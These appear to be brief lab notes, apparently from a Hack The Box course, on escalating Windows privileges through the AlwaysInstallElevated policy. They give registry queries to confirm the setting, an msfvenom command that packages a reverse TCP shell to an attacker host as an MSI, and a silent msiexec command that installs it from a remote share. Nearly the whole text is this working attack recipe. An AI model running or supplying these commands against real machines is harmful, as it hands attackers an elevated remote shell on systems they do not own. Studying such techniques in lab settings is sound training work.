Requirements:
- two checks are required, , msi elevated is enabled, and enabled for current user
`check if its enabled for current user`
```powershell-session
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

    AlwaysInstallElevated    REG_DWORD    0x1
```

---
 
`check if alwaysinstallelevated is enabled`
```powershell-session
PS C:\htb> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

    AlwaysInstallElevated    REG_DWORD    0x1
```
### exploit
`payload (to be installed msi file)`
```
msfvenom -p windows/x64/shell_reverse_tcp lhost=$attacker lport=443 -f msi -o reverse.msi
```

`run the exploit`
```cmd-session
	C:\htb> msiexec /i \\tsclient\share\Ser.msi /quiet /qn /norestart
```
 